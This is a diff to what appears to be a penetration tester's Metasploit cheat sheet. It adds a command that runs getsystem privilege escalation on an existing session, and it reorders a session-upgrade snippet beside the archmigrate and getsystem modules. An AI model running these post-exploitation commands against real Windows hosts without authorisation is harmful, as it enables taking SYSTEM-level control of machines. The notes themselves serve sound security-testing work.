@@ -199,6 +199,11 @@ set SESSION <1>
 set TECHNIQUE <6>
 ```
 
+# msfconsole
+```ruby
+sessions -C "getsystem -t 6" -i 14
+```
+
 # Run
 ```ruby
 use post/windows/escalate/getsystem
@@ -206,15 +211,15 @@ run -o SESSION=<1>,TECHNIQUE=<6>
 ```
 
 # Migrate between architectures
+## session
+```ruby
+session -u <3>
+```
+
 ## archmigrate
 ```ruby
 use post/windows/manage/archmigrate
 set SESSION <1>
-```
-
-## session
-```ruby
-session -u 3
 ```
 
 ## shell_to_meterpreter
